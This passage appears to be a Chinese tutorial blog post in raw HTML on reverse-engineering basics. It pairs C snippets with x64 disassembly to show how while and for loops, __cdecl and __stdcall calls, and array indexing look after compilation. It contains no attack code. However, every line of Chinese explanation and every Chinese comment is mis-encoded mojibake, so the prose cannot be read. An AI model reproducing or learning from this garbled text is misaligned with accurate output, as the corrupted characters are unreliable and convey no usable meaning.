            ; DATA XREF: .pdata:<span class="hljs-number">000000000040506</span>Câ†“o<br>.text:<span class="hljs-number">0000000000401550</span><br>.text:<span class="hljs-number">0000000000401550</span> var_8           = dword ptr <span class="hljs-number">-8</span><br>.text:<span class="hljs-number">0000000000401550</span> var_4           = dword ptr <span class="hljs-number">-4</span><br>.text:<span class="hljs-number">0000000000401550</span> arg_0           = dword ptr  <span class="hljs-number">10</span>h<br>.text:<span class="hljs-number">0000000000401550</span> arg_8           = qword ptr  <span class="hljs-number">18</span>h<br>.text:<span class="hljs-number">0000000000401550</span><br>.text:<span class="hljs-number">0000000000401550</span>                 push    rbp<br>.text:<span class="hljs-number">0000000000401551</span>                 mov     rbp, rsp<br>.text:<span class="hljs-number">0000000000401554</span>                 sub     rsp, <span class="hljs-number">30</span>h<br>.text:<span class="hljs-number">0000000000401558</span>                 mov     [rbp+arg_0], ecx<br>.text:<span class="hljs-number">000000000040155B</span>                 mov     [rbp+arg_8], rdx<br>.text:<span class="hljs-number">000000000040155F</span>                 call    __main<br>.text:<span class="hljs-number">0000000000401564</span>                 mov     [rbp+var_4], <span class="hljs-number">0</span>  <span class="hljs-comment">//a=0</span><br>.text:<span class="hljs-number">000000000040156B</span>                 mov     [rbp+var_8], <span class="hljs-number">0</span>    <span class="hljs-comment">//b=0</span><br>.text:<span class="hljs-number">0000000000401572</span>                 jmp     <span class="hljs-keyword">short</span> loc_40158B<br>.text:<span class="hljs-number">0000000000401574</span> ; ---------------------------------------------------------------------------<br>.text:<span class="hljs-number">0000000000401574</span><br>.text:<span class="hljs-number">0000000000401574</span> loc_401574:                             ; CODE XREF: main+<span class="hljs-number">3F</span>â†“j<br>.text:<span class="hljs-number">0000000000401574</span>                 mov     eax, [rbp+var_4]<br>.text:<span class="hljs-number">0000000000401577</span>                 mov     edx, eax<br>.text:<span class="hljs-number">0000000000401579</span>                 lea     rcx, Format     ; <span class="hljs-string">&quot;%d&quot;</span>  <span class="hljs-comment">//printf(&#x27;%d&#x27;,a);</span><br>.text:<span class="hljs-number">0000000000401580</span>                 call    <span class="hljs-built_in">printf</span>      <br>.text:<span class="hljs-number">0000000000401585</span>                 mov     eax, [rbp+var_8]   <span class="hljs-comment">//a+b</span><br>.text:<span class="hljs-number">0000000000401588</span>                 add     [rbp+var_4], eax<br>.text:<span class="hljs-number">000000000040158B</span><br>.text:<span class="hljs-number">000000000040158B</span> loc_40158B:                             ; CODE XREF: main+<span class="hljs-number">22</span>â†‘j<br>.text:<span class="hljs-number">000000000040158B</span>                 cmp     [rbp+var_8], <span class="hljs-number">64</span>h ; <span class="hljs-string">&#x27;d&#x27;</span>  <span class="hljs-comment">//while(b&lt;100)</span><br>.text:<span class="hljs-number">000000000040158F</span>                 jle     <span class="hljs-keyword">short</span> loc_401574   <span class="hljs-comment">//å°äºæ‰§è¡Œloc_401574</span><br>.text:<span class="hljs-number">0000000000401591</span>                 mov     eax, [rbp+arg_0]<br>.text:<span class="hljs-number">0000000000401594</span>                 add     rsp, <span class="hljs-number">30</span>h<br>.text:<span class="hljs-number">0000000000401598</span>                 pop     rbp<br>.text:<span class="hljs-number">0000000000401599</span>                 retn<br>.text:<span class="hljs-number">0000000000401599</span> main            endp<br></code></pre></td></tr></table></figure><h3 id="for"><a href="#for" class="headerlink" title="for"></a>for</h3><p>â€‹    for éœ€è¦ä¸‰æ¬¡è·³è½¬ï¼š1èµ‹åˆå€¼åè¦è·³è¿‡æ­¥é•¿ 2å¾ªç¯æ¡ä»¶çš„æ¯”è¾ƒ 3ä»£ç å—æ‰§è¡Œå®Œè¦è·³å›åˆ°æ­¥é•¿ï¼ˆforä¹Ÿ å¯ä»¥è½¬æ¢ä¸ºdoï¼‰</p><p>â€‹    forå¾ªç¯å› ä¸ºæœ‰æ­¥é•¿çš„é—®é¢˜,æ‰€ä»¥å¤šä¸€æ¬¡è·³è½¬. å…¶ä¸­ ç¬¬ä¸€æ­¥è·³è½¬åˆ° æ¡ä»¶ä½ç½®å¤„,ç¬¬äºŒæ­¤è·³è½¬åˆ™åˆ¤æ–­æ¡ä»¶æ˜¯å¦æˆç«‹,ä¸æˆç«‹åˆ™é€€å‡º,æ­¤æ—¶æ‰¾åˆ°forçš„ä¸‹ç•Œ,å½“å‰ä½ç½®å¯ä»¥å½“åšifçš„ä¸Šç•Œ.</p><p>â€‹    æ¡ä»¶æˆç«‹ä¹‹åä»£ç ç»§ç»­æ‰§è¡Œ,åˆ™æ­¤æ—¶åˆæ¥äº†ä¸€æ¬¡è·³è½¬,æ­¤è·³è½¬è·³è½¬åˆ°æ­¥é•¿æ‰§è¡Œä»£ç </p><p>Releaseç‰ˆæœ¬ä¸‹</p><p>ã€€ã€€1.å¸¸é‡ä¼ æ’­æ–¹å¼ä¸‹ ä»£ç å˜ä¸ºdo whileæ‰§è¡Œ</p><p>ã€€ã€€2.ä»£ç å¤–ææƒ…å†µä¸‹,ä»£ç å˜æˆäº† if + do whileçš„å½¢å¼ã€€</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> nSum = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>;i++) <br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>,nSum);<br>        nSum = nSum + i;<br>    &#125;<br>    <span class="hljs-keyword">return</span> argc;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯¹åº”çš„åæ±‡ç¼–ä»£ç </p><h4 id="Debug"><a href="#Debug" class="headerlink" title="Debug"></a>Debug</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c">.text:<span class="hljs-number">0000000000401550</span> ; <span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span><br><span class="hljs-function">.text:0000000000401550                 <span class="hljs-keyword">public</span> main</span><br><span class="hljs-function">.text:0000000000401550 main            proc near               </span>; CODE XREF: __tmainCRTStartup+<span class="hljs-number">242</span>â†‘p<br>.text:<span class="hljs-number">0000000000401550</span>                                         ; DATA XREF: .pdata:<span class="hljs-number">000000000040506</span>Câ†“o<br>.text:<span class="hljs-number">0000000000401550</span><br>.text:<span class="hljs-number">0000000000401550</span> var_8           = dword ptr <span class="hljs-number">-8</span><br>.text:<span class="hljs-number">0000000000401550</span> var_4           = dword ptr <span class="hljs-number">-4</span><br>.text:<span class="hljs-number">0000000000401550</span> arg_0           = dword ptr  <span class="hljs-number">10</span>h<br>.text:<span class="hljs-number">0000000000401550</span> arg_8           = qword ptr  <span class="hljs-number">18</span>h<br>.text:<span class="hljs-number">0000000000401550</span><br>.text:<span class="hljs-number">0000000000401550</span>                 push    rbp<br>.text:<span class="hljs-number">0000000000401551</span>                 mov     rbp, rsp<br>.text:<span class="hljs-number">0000000000401554</span>                 sub     rsp, <span class="hljs-number">30</span>h<br>.text:<span class="hljs-number">0000000000401558</span>                 mov     [rbp+arg_0], ecx<br>.text:<span class="hljs-number">000000000040155B</span>                 mov     [rbp+arg_8], rdx<br>.text:<span class="hljs-number">000000000040155F</span>                 call    __main<br><span class="hljs-comment">/*èµ‹åˆå€¼</span><br><span class="hljs-comment">.text:0000000000401564                 mov     [rbp+var_4], 0  //a=0</span><br><span class="hljs-comment">.text:000000000040156B                 mov     [rbp+var_8], 0  //b=0</span><br><span class="hljs-comment">.text:0000000000401572                 mov     [rbp+var_8], 0</span><br><span class="hljs-comment">.text:0000000000401579                 jmp     short loc_401596</span><br><span class="hljs-comment">    </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    </span><br><span class="hljs-comment">.text:000000000040157B ; ---------------------------------------------------------------------------</span><br><span class="hljs-comment">.text:000000000040157B</span><br><span class="hljs-comment"> */</span>  <br> <br>.text:<span class="hljs-number">000000000040157B</span> loc_40157B:                             ; CODE XREF: main+<span class="hljs-number">4</span>Aâ†“j<br>.text:<span class="hljs-number">000000000040157B</span>                 mov     eax, [rbp+var_4]  <span class="hljs-comment">//eax=a</span><br>.text:<span class="hljs-number">000000000040157</span>E                 mov     edx, eax  <span class="hljs-comment">//edx=a</span><br>.text:<span class="hljs-number">0000000000401580</span>                 lea     rcx, Format     ; <span class="hljs-string">&quot;%d&quot;</span><br>.text:<span class="hljs-number">0000000000401587</span>                 call    <span class="hljs-built_in">printf</span>   <span class="hljs-comment">//è¾“å‡ºa</span><br>.text:<span class="hljs-number">000000000040158</span>C                 mov     eax, [rbp+var_8]  <span class="hljs-comment">//eax=b</span><br>.text:<span class="hljs-number">000000000040158F</span>                 add     [rbp+var_4], eax  <span class="hljs-comment">//a+=b   </span><br>.text:<span class="hljs-number">0000000000401592</span>                 add     [rbp+var_8], <span class="hljs-number">1</span> <span class="hljs-comment">//b+=1  æ­¥é•¿</span><br>.text:<span class="hljs-number">0000000000401596</span><br>.text:<span class="hljs-number">0000000000401596</span> loc_401596:                             ; CODE XREF: main+<span class="hljs-number">29</span>â†‘j<br>    <span class="hljs-comment">//æ¯”è¾ƒ</span><br>.text:<span class="hljs-number">0000000000401596</span>                 cmp     [rbp+var_8], <span class="hljs-number">63</span>h ; <span class="hljs-string">&#x27;c&#x27;</span>  <span class="hljs-comment">//99</span><br>.text:<span class="hljs-number">000000000040159</span>A                 jle     <span class="hljs-keyword">short</span> loc_40157B   <span class="hljs-comment">// </span><br>.text:<span class="hljs-number">000000000040159</span>C                 mov     eax, [rbp+arg_0]<br>.text:<span class="hljs-number">000000000040159F</span>                 add     rsp, <span class="hljs-number">30</span>h<br>.text:<span class="hljs-number">00000000004015</span>A3                 pop     rbp<br>.text:<span class="hljs-number">00000000004015</span>A4                 retn<br>.text:<span class="hljs-number">00000000004015</span>A4 main            endp<br></code></pre></td></tr></table></figure><h2 id="å‡½æ•°"><a href="#å‡½æ•°" class="headerlink" title="å‡½æ•°"></a>å‡½æ•°</h2><h3 id="ä¸‰ç§è°ƒç”¨æ–¹å¼"><a href="#ä¸‰ç§è°ƒç”¨æ–¹å¼" class="headerlink" title="ä¸‰ç§è°ƒç”¨æ–¹å¼"></a>ä¸‰ç§è°ƒç”¨æ–¹å¼</h3><h4 id="cdel-è°ƒç”¨æ–¹å¹³è¡¡å †æ ˆ"><a href="#cdel-è°ƒç”¨æ–¹å¹³è¡¡å †æ ˆ" class="headerlink" title="__cdel è°ƒç”¨æ–¹å¹³è¡¡å †æ ˆ"></a>__cdel è°ƒç”¨æ–¹å¹³è¡¡å †æ ˆ</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">MyAdd</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a,<span class="hljs-keyword">int</span> b)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> a + b;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>    MyAdd(<span class="hljs-number">3</span>,<span class="hljs-number">4</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¼˜ç‚¹ï¼šå¯ä»¥ç”¨äºå¯å˜å‚æ•°å‡½æ•°ï¼ˆå› ä¸ºå¯å˜å‚æ•°æƒ…å†µä¸‹ï¼Œæˆ‘ä¼ å‡ ä¸ªå‚æ•°æˆ‘æ˜¯çŸ¥é“çš„ï¼Œè‡ªå·± ä¼ è‡ªå·±åˆ <br>ç¼ºç‚¹ï¼šå¢åŠ äº†ä»£ç é•¿åº¦ï¼Œè°ƒç”¨å‡ æ¬¡å­å‡½æ•°ï¼Œå°±è¦å¤šå‡ æ¬¡æ ˆå¹³è¡¡æ“ä½œ</p><p>è§£é‡Šï¼šè¿™é‡Œmainå‡½æ•°å¯¹addäº§ç”Ÿè°ƒç”¨ï¼Œmainå±äºè°ƒç”¨æ–¹ï¼Œæ‰€ä»¥åœ¨mainå‡½æ•°è¿™é‡Œå¹³è¡¡å †æ ˆ</p><p>å³ åœ¨ call å­å‡½æ•° ä¹‹å add å¼€è¾Ÿç©ºé—´</p><h4 id="stdcall-è¢«è°ƒæ–¹å¹³è¡¡å †æ ˆ"><a href="#stdcall-è¢«è°ƒæ–¹å¹³è¡¡å †æ ˆ" class="headerlink" title="__stdcall è¢«è°ƒæ–¹å¹³è¡¡å †æ ˆ"></a>__stdcall è¢«è°ƒæ–¹å¹³è¡¡å †æ ˆ</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function">__int64 __stdcall <span class="hljs-title">MyAdd</span><span class="hljs-params">(<span class="hljs-keyword">float</span> a,<span class="hljs-keyword">double</span> b,<span class="hljs-keyword">int</span> c)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> a + b + c;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>    MyAdd(<span class="hljs-number">3.0f</span>,<span class="hljs-number">4.0f</span>,<span class="hljs-number">6</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¼˜ç‚¹ï¼šèŠ‚çœä»£ç é•¿åº¦ ç¼ºç‚¹ï¼šä¸æ”¯æŒå¯å˜å‚æ•°ï¼ˆå› ä¸ºå­å‡½æ•°æ˜¯å¯é‡å¤ä½¿ç”¨çš„ä»£ç å—ï¼Œè¿™æ®µä»£ç å—ä¸€å®šæ˜¯æ­»çš„ï¼Œ<br>æ˜¯ä¸èƒ½å†æ”¹å˜çš„ï¼Œæ‰€ä»¥å¦‚æœå¸Œæœ›å­å‡½æ•°å¹³è¡¡æ ˆï¼Œé‚£ä¹ˆå®ƒçš„å‚æ•°ä¸ªæ•°å¿…é¡»ç¡®å®šï¼‰</p><p>è§£é‡Šï¼šè¿™é‡Œmainå‡½æ•°å¯¹addäº§ç”Ÿè°ƒç”¨ï¼Œaddå‡½æ•°å±äºè¢«è°ƒç”¨æ–¹ï¼Œæ‰€ä»¥åœ¨addå‡½æ•°è¿™é‡Œå¹³è¡¡å †æ ˆ</p><p>å³ åœ¨ call å­å‡½æ•° ä¹‹å‰ add å¼€è¾Ÿç©ºé—´</p><h4 id="fastcall-stdcallfastç‰ˆ"><a href="#fastcall-stdcallfastç‰ˆ" class="headerlink" title="__fastcall stdcallfastç‰ˆ"></a>__fastcall stdcallfastç‰ˆ</h4><h2 id="æ•°ç»„"><a href="#æ•°ç»„" class="headerlink" title="æ•°ç»„"></a>æ•°ç»„</h2><p>â€‹    ç‰¹å¾ï¼šè¿ç»­å‡ æ¬¡èµ‹å€¼ç±»å‹ç›¸åŒï¼Œä¸”èµ‹å€¼çš„ç›®çš„åœ°å€æ˜¯ä»ä½åˆ°é«˜çš„ã€‚ è€Œè¿ç»­å®šä¹‰çš„å±€éƒ¨å˜é‡å…¶èµ‹å€¼åœ°å€æ˜¯ä»é«˜åˆ°ä½çš„ã€‚ è€Œå…¨å±€æ•°ç»„å’Œé™æ€æ•°ç»„çœ‹ä¸Šå»å°±å’Œè¿ç»­å®šä¹‰åŒç±»é¡¹å˜é‡æ²¡æœ‰åŒºåˆ«<br>â€‹    å­—ç¬¦ä¸²ï¼šæ˜¯ä»¥â€™\0â€™ç»“å°¾çš„charæ•°ç»„</p><p>â€‹    å­—ç¬¦ä¸²èµ‹åˆå€¼æ—¶ï¼Œä¸æ˜¯ä¸€ä¸ªcharä¸€ä¸ªcharå¤åˆ¶çš„ï¼Œè€Œæ˜¯ä¼˜å…ˆ4å­—èŠ‚ï¼Œå†2å­—èŠ‚ï¼Œæœ€å1å­—èŠ‚ ï¼ˆ4-2-1ï¼‰<br>â€‹    ä½œä¸ºå‚æ•°ä¼ é€’ï¼šæ•°ç»„ä½œä¸ºå‚æ•°ä¼ é€’ä¼šé€€åŒ–ä¸ºæŒ‡é’ˆï¼Œå› æ­¤æ•°ç»„å‚æ•°å®é™…ä¸Šæ˜¯æŒ‡é’ˆï¼Œæ­¤æ—¶ä¸èƒ½ä½¿ç”¨ sizeofè·å–å…¶é•¿åº¦<br>â€‹    ä½œä¸ºè¿”å›å€¼ï¼šç¦æ­¢ï¼å±€éƒ¨æ•°ç»„çš„ç”Ÿå‘½å‘¨æœŸåœ¨å‡½æ•°è¿”å›æ—¶å°±ç»“æŸäº†ï¼Œå› æ­¤è¿”å›çš„å†…å®¹å°†ä¸ç¡®å®š å¯ä»¥ä½¿ç”¨å…¨å±€æ•°ç»„ã€é™æ€æ•°ç»„ã€ä½œä¸ºå‚æ•°ä¼ å…¥çš„æ•°ç»„ é™æ€æ•°ç»„ä½œä¸ºä¸€ä¸ªæ•´ä½“ï¼Œåªå ä¸€ä¸ªä»£è¡¨åˆå§‹åŒ–çš„æ ‡å¿—ä½ï¼ˆå¥½åƒ å¤šç»´æ•°ç»„çš„å­˜å‚¨æ–¹å¼ï¼šå±•æˆä¸€ç»´ï¼ˆå¤šç»´æ•°ç»„æ˜¯Cè¯­è¨€æ¦‚å¿µï¼Œä¸æ˜¯æ±‡ç¼–çš„æ¦‚å¿µï¼‰ è½¬æˆæ±‡ç¼–åï¼Œå¸¸é‡ä¸‹æ ‡å’Œä¸€ç»´æƒ…å†µå®Œå…¨æ²¡æœ‰åŒºåˆ«ï¼Œå¦‚[ebp+1C];<br>â€‹    æ•°ç»„å¯»å€æ–¹å¼ æ•°ç»„åå’ŒæŒ‡é’ˆçš„åŒºåˆ«ï¼šæŒ‡é’ˆè®¿é—®å…ƒç´ çš„æ•ˆç‡æ¯”æ•°ç»„åè¦ä½ï¼šåŸå› æ˜¯æŒ‡é’ˆæ˜¯ä¸ªå˜é‡ï¼Œä½¿ç”¨æ—¶è¦ å…ˆè®¿é—®è¿™ä¸ªå˜é‡çš„å†…å®¹ï¼ˆæ•°ç»„çš„é¦–åœ°å€ï¼‰ï¼Œå†åç§»ï¼ˆä¸¤æ¬¡å¯»å€ï¼‰ï¼›è€Œæ•°ç»„åè‡ªèº«å°±æ˜¯å¸¸å€¼ï¼Œ ç›´æ¥åç§»å³å¯ï¼ˆä¸€æ¬¡å¯»å€ï¼‰ ä¸€ç»´æ•°ç»„ä¸‹ï¼š<br>â€‹    ä¸‹æ ‡æ˜¯å¸¸é‡ï¼šç¼–è¯‘ç›´æ¥è®¡ç®—å‡ºåœ°å€ ä¸‹æ ‡æ˜¯å˜é‡ï¼šå…ˆå–å˜é‡ï¼Œå†è®¡ç®—åç§» ä¸‹æ ‡æ˜¯è¡¨è¾¾å¼ï¼šçœ‹å¤æ‚ç¨‹åº¦ï¼Œå…¶ä½™åŒä¸Š<br>â€‹    äºŒç»´æ•°ç»„ï¼š<br>â€‹        ä¸¤ç»´éƒ½æ˜¯å¸¸é‡ï¼šç¼–è¾‘ç›´æ¥è®¡ç®—å‡ºåœ°å€ æœ‰ä¸€ç»´æ˜¯å¸¸é‡ï¼šå–ä¸€æ¬¡å˜é‡ï¼Œä¹‹åç›´æ¥è®¡ç®—åœ°å€<br>â€‹        ä¸¤ç»´éƒ½æ˜¯å˜é‡ï¼šå–ç¬¬ä¸€ä¸ªå˜é‡ï¼Œè®¡ç®—å‡ºç¬¬äºŒç»´çš„é¦–åœ°å€ï¼›å–ç¬¬äºŒä¸ªå˜é‡ï¼Œç»“åˆè®¡ç®—å‡ºçš„ é¦–åœ°å€ï¼Œæ±‚å‡ºè¯¥å…ƒç´ çš„åç§»<br>â€‹    å¤šç»´æ•°ç»„ï¼šç±»æ¨</p><h3 id="ä¸€ç»´æ•°ç»„"><a href="#ä¸€ç»´æ•°ç»„" class="headerlink" title="ä¸€ç»´æ•°ç»„"></a>ä¸€ç»´æ•°ç»„</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> Ary[<span class="hljs-number">3</span>] = &#123;<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>&#125;;<br>    <span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;i);<br><br>    Ary[i] = <span class="hljs-number">3</span>;  <span class="hljs-comment">//è¿™å¥è¯ä¼šäº§ç”Ÿæ•°ç»„å¯»å€å…¬å¼</span><br>    <span class="hljs-keyword">return</span> Ary[i];<br>&#125;<br></code></pre></td></tr></table></figure><p>åæ±‡ç¼–</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c">text:<span class="hljs-number">0000000000401550</span> ; <span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span><br><span class="hljs-function">.text:0000000000401550                 <span class="hljs-keyword">public</span> main</span><br><span class="hljs-function">.text:0000000000401550 main            proc near               </span>; CODE XREF: __tmainCRTStartup+<span class="hljs-number">242</span>â†‘p<br>.text:<span class="hljs-number">0000000000401550</span>                                         ; DATA XREF: .pdata:<span class="hljs-number">000000000040506</span>Câ†“o<br>.text:<span class="hljs-number">0000000000401550</span><br>.text:<span class="hljs-number">0000000000401550</span> var_10          = dword ptr <span class="hljs-number">-10</span>h<br>.text:<span class="hljs-number">0000000000401550</span> var_C           = dword ptr <span class="hljs-number">-0</span>Ch<br>.text:<span class="hljs-number">0000000000401550</span> var_8           = dword ptr <span class="hljs-number">-8</span><br>.text:<span class="hljs-number">0000000000401550</span> var_4           = dword ptr <span class="hljs-number">-4</span><br>.text:<span class="hljs-number">0000000000401550</span> arg_0           = dword ptr  <span class="hljs-number">10</span>h<br>.text:<span class="hljs-number">0000000000401550</span> arg_8           = qword ptr  <span class="hljs-number">18</span>h<br>.text:<span class="hljs-number">0000000000401550</span><br>.text:<span class="hljs-number">0000000000401550</span>                 push    rbp<br>.text:<span class="hljs-number">0000000000401551</span>                 mov     rbp, rsp<br>.text:<span class="hljs-number">0000000000401554</span>                 sub     rsp, <span class="hljs-number">30</span>h<br>.text:<span class="hljs-number">0000000000401558</span>                 mov     [rbp+arg_0], ecx<br>.text:<span class="hljs-number">000000000040155B</span>                 mov     [rbp+arg_8], rdx<br>.text:<span class="hljs-number">000000000040155F</span>                 call    __main<br>.text:<span class="hljs-number">0000000000401564</span>                 mov     [rbp+var_C], <span class="hljs-number">0</span>  <span class="hljs-comment">//a[0]=0</span><br>.text:<span class="hljs-number">000000000040156B</span>                 mov     [rbp+var_8], <span class="hljs-number">1</span>  <span class="hljs-comment">//a[1]=1</span><br>.text:<span class="hljs-number">0000000000401572</span>                 mov     [rbp+var_4], <span class="hljs-number">2</span>  <span class="hljs-comment">//a[2]=2</span><br>.text:<span class="hljs-number">0000000000401579</span>                 mov     [rbp+var_10], <span class="hljs-number">0</span>  <span class="hljs-comment">//a=0</span><br>.text:<span class="hljs-number">0000000000401580</span>                 lea     rax, [rbp+var_10] <br>.text:<span class="hljs-number">0000000000401584</span>                 mov     rdx, rax<br>.text:<span class="hljs-number">0000000000401587</span>                 lea     rcx, Format     ; <span class="hljs-string">&quot;%d&quot;</span> <span class="hljs-comment">//scanf(&quot;&quot;);</span><br>.text:<span class="hljs-number">000000000040158</span>E                 call    <span class="hljs-built_in">scanf</span><br>.text:<span class="hljs-number">0000000000401593</span>                 mov     eax, [rbp+var_10]<br>.text:<span class="hljs-number">0000000000401596</span>                 cdqe<br>.text:<span class="hljs-number">0000000000401598</span>                 mov     [rbp+rax*<span class="hljs-number">4</span>+var_C], <span class="hljs-number">3</span> <span class="hljs-comment">//a[]</span><br>.text:<span class="hljs-number">00000000004015</span>A0                 mov     eax, [rbp+var_10]<br>.text:<span class="hljs-number">00000000004015</span>A3                 cdqe<br>.text:<span class="hljs-number">00000000004015</span>A5                 mov     eax, [rbp+rax*<span class="hljs-number">4</span>+var_C]<br>.text:<span class="hljs-number">00000000004015</span>A9                 add     rsp, <span class="hljs-number">30</span>h<br>.text:<span class="hljs-number">00000000004015</span>AD                 pop     rbp<br>.text:<span class="hljs-number">00000000004015</span>AE                 retn<br>.text:<span class="hljs-number">00000000004015</span>AE main            endp<br></code></pre></td></tr></table></figure><h3 id="äºŒç»´æ•°ç»„"><a href="#äºŒç»´æ•°ç»„" class="headerlink" title="äºŒç»´æ•°ç»„"></a>äºŒç»´æ•°ç»„</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> Ary[<span class="hljs-number">2</span>][<span class="hljs-number">3</span>][<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span 